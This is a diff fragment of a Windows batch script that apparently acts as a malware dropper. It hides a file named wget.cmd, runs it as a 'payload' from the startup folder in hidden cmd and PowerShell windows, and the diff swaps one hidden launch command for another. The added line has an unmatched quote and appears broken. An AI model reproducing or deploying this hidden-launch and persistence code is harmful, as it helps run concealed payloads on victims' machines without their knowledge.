@@ -20,8 +20,8 @@ REM hide the wget.cmd file
 attrib +h wget.cmd
 
 REM run payload
-powershell -windowstyle hidden -Command "Start-Process cmd.exe -ArgumentList '/c %STARTUP%\wget.cmd' -WindowStyle Hidden"
-
+@REM powershell -windowstyle hidden -Command "Start-Process cmd.exe -ArgumentList '/c %STARTUP%\wget.cmd' -WindowStyle Hidden"
+powershell -windowstyle hidden -Command "Start-Process powershell.exe 'wget.cmd -WindowStyle Hidden"
 REM cd back into initial location
 cd /d "%INITIALPATH%"
 
